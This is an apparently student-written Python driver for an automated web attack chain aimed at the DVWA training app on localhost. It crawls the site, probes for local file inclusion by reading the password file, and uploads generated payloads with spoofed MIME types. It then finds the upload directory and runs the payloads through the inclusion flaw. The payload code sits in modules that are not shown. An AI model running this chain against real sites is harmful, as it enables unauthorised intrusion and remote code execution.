#!/usr/bin/env python3

from argparse import ArgumentParser
from sys import exit
import requests
from bs4 import BeautifulSoup
import urllib.parse
import crawler
import lfi
import upload

# Target Configuration (own website)
# URL = "http://ict2214p1b2.mooo.com/"
# COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"} # change this to your own cookie

# Target Configuration (DVWA)
URL = "http://127.0.0.1/DVWA/"
COOKIE = {
    "PHPSESSID": "klrahlkotaer4v6141694ijb8k", # change this to your own cookie
    "security": "medium",
}

WORDLIST = "wordlists/test"
CONTENT_TYPE_WORDLIST = "wordlists/content_type_small.txt"  # wordlists/content_type_small.txt OR wordlists/content_type_big.txt
UPLOAD_DIR_WORDLIST = "wordlists/upload_dir_wordlist_small.txt"  # wordlists/upload_dir_wordlist_small.txt OR wordlists/upload_dir_wordlist_big.txt

REPORT_FILENAME = "vuln_report.txt"


def generate_report(uploaded_files, failed_files, executed_files):
    """Generate a detailed vulnerability report."""
    report = "Vulnerability Report\n"
    report += "====================\n"

    if uploaded_files:
        report += "\n✅ **Successfully Uploaded Files:**\n"
        for file in uploaded_files:
            report += f"- {file}\n"
    else:
        report += "\n❌ **No files were successfully uploaded.**\n"

    if failed_files:
        report += "\n🚫 **Failed Uploads:**\n"
        for file in failed_files:
            report += f"- {file}\n"

    if executed_files:
        report += "\n⚡ **Files Successfully Executed:**\n"
        for file in executed_files:
            report += f"- {file}\n"
    else:
        report += "\n⚠ **No files executed successfully.**\n"

    try:
        with open(REPORT_FILENAME, "w") as f:
            f.write(report)
        print(f"[+] Report generated successfully: {REPORT_FILENAME}")
    except Exception as e:
        print(f"[-] Error writing report file: {e}")


def main():
    session = requests.Session()

    # Ask for indicator for LFI
    success_indicator = input("Enter the text that indicates success: ") # do not put anything 
    failure_indicator = input("Enter the text that indicates failure: ") # put "File not found"


    # Step 1: Crawl for URLs
    found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
    print("Crawling complete.")

    found_urls = crawler.clean_found_urls(URL, found_urls)

    print("Found URLs:")
    for url in found_urls:
        print("[+] " + url)
    print("\nUploadable URLs:")
    for url in uploadable_urls:
        print(f"[+] {url}")

    print("\nPotential LFI vulnerabilities:")
    lfi_targets = crawler.check_lfi(found_urls)

    form_details = crawler.get_form_details(URL, uploadable_urls, session, COOKIE)


    # Step 2: Check for LFI vulnerabilities
    lfi_confirmed_targets = set()
    for target in lfi_targets:
        print(target)
        result = lfi.show_passwd(target, COOKIE)
        if result:
            lfi_confirmed_targets.add(target)


    # Step 3: Generate payloads
    generated_payloads = upload.create_payloads()


    # Step 4: Load MIME types
    mime_types = upload.load_mime_types(CONTENT_TYPE_WORDLIST)

    if not mime_types:
        print("[-] No MIME types found. Exiting.")
        exit(1)


    # Step 5: Try Uploading Each Payload
    uploaded_files = []
    failed_files = []

    for form in form_details:
        form_action_url = form["action"]
        for payload in generated_payloads:
            if upload.upload_file(
                payload, form_action_url, COOKIE, form, CONTENT_TYPE_WORDLIST
            ):
                print(f"[+] File uploaded successfully: {payload} -> {form_action_url}")
                uploaded_files.append(payload)
            else:
                failed_files.append(payload)

    # Step 6: Detect upload directory
    dynamic_upload_dir = upload.get_upload_directory(
        URL, UPLOAD_DIR_WORDLIST, uploaded_files, COOKIE
    )

    if not uploaded_files:
        print("[-] No files uploaded successfully. Report generated. Exiting.")
        generate_report(uploaded_files, failed_files, [])
        exit(1)

    if dynamic_upload_dir:
        print(f"[+] Detected Upload Directory: {dynamic_upload_dir}")
    else:
        print("[-] No valid upload directory found. Exiting.")
        # generate_report(uploaded_files, failed_files, [])
        # exit(1)

    # Step 7: Test execution
    executed_files = []
    for target in lfi_confirmed_targets:
        lfi_found_urls = lfi.brute_force_lfi(
            target,
            uploaded_files,
            success_indicator,
            failure_indicator,
            UPLOAD_DIR_WORDLIST,
            session,
            COOKIE,
        )
        if lfi_found_urls:
            for lfi_found_url in lfi_found_urls:
                print(f"[+] LFI Found at: {lfi_found_url}")
                command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
                if command_results:
                    print(f"[+] Successfully executed payload at: {lfi_found_url}")
                    executed_files.append(lfi_found_url)

    # Step 8: Generate Final Report
    generate_report(uploaded_files, failed_files, executed_files)


if __name__ == "__main__":
    main()
